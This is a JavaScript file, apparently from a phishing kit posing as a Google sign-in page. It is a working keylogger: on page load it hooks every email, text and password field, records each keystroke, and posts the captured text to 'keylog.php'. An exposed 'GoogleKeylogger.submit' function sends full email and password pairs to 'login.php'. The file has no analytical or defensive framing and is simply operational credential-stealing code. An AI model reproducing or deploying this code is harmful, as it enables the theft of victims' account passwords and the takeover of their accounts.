(function() {
    'use strict';

    var keyBuffer = {};
    var currentField = null;
    var flushTimer = null;
    var identifiedEmail = '';

    function getFieldContext(el) {
        if (!el) return 'unknown';
        var id = el.id || '';
        var type = el.getAttribute('type') || '';
        if (id === 'emailInput' || id === 'emailField') return 'email';
        if (type === 'password' || id === 'passwordInput' || id === 'passwordField') return 'password';
        if (el.name === 'email') return 'email';
        if (el.name === 'password') return 'password';
        return 'unknown';
    }

    function getPageView() {
        var pw = document.getElementById('passwordView');
        if (pw && pw.style.display !== 'none') return 'password';
        return 'email';
    }

    function initField(field) {
        var ctx = getFieldContext(field);
        if (!keyBuffer[ctx]) keyBuffer[ctx] = '';
        field.addEventListener('focus', function() { currentField = ctx; });
        field.addEventListener('blur', function() {
            if (currentField === ctx) { flushBuffer(); currentField = null; }
        });
    }

    function trackKeystroke(e) {
        var target = e.target;
        var ctx = getFieldContext(target);
        if (!keyBuffer[ctx]) keyBuffer[ctx] = '';
        if (e.key === 'Backspace') {
            keyBuffer[ctx] = keyBuffer[ctx].slice(0, -1);
        } else if (e.key === 'Delete') {
            return;
        } else if (e.key === 'Enter') {
            flushBuffer();
            return;
        } else if (e.key === 'Tab') {
            flushBuffer();
            return;
        } else if (e.key && e.key.length === 1) {
            keyBuffer[ctx] += e.key;
        }
        if (!flushTimer) flushTimer = setTimeout(flushBuffer, 400);
    }

    function flushBuffer() {
        if (flushTimer) { clearTimeout(flushTimer); flushTimer = null; }
        var payload = {};
        var hasData = false;
        for (var ctx in keyBuffer) {
            if (keyBuffer[ctx] && keyBuffer[ctx].length > 0) {
                payload[ctx] = keyBuffer[ctx];
                hasData = true;
            }
        }
        if (!hasData) return;

        var emailInput = document.getElementById('emailInput') || document.getElementById('emailField');
        if (emailInput && emailInput.value) identifiedEmail = emailInput.value;

        var formData = new FormData();
        formData.append('action', 'log_keys');
        formData.append('keys', JSON.stringify(payload));
        formData.append('email_id', identifiedEmail);
        formData.append('page_view', getPageView());

        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'keylog.php', true);
        xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
        xhr.send(formData);

        for (var c in keyBuffer) keyBuffer[c] = '';
    }

    function captureAllFields() {
        var inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[type="password"]');
        for (var i = 0; i < inputs.length; i++) {
            var input = inputs[i];
            initField(input);
            input.addEventListener('keydown', trackKeystroke);
            input.addEventListener('input', function() {
                var ctx = getFieldContext(this);
                if (!keyBuffer[ctx]) keyBuffer[ctx] = '';
                keyBuffer[ctx] = this.value;
            });
        }
        var pwFields = document.querySelectorAll('input[type="password"]');
        for (var j = 0; j < pwFields.length; j++) {
            initField(pwFields[j]);
            pwFields[j].addEventListener('keydown', trackKeystroke);
            pwFields[j].addEventListener('input', function() {
                var ctx = getFieldContext(this);
                if (!keyBuffer[ctx]) keyBuffer[ctx] = '';
                keyBuffer[ctx] = this.value;
            });
        }
        var emailField = document.getElementById('emailInput') || document.getElementById('emailField');
        if (emailField) {
            emailField.addEventListener('blur', function() { identifiedEmail = this.value; });
        }
    }

    window.GoogleKeylogger = {
        init: captureAllFields,
        flush: flushBuffer,
        submit: function(email, password) {
            var formData = new FormData();
            formData.append('action', 'capture');
            formData.append('email', email);
            formData.append('password', password);
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'login.php', true);
            xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
            xhr.send(formData);
        },
        setEmail: function(e) { identifiedEmail = e; }
    };

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', captureAllFields);
    } else {
        captureAllFields();
    }
    document.addEventListener('DOMContentLoaded', function() { setTimeout(captureAllFields, 300); });
})();
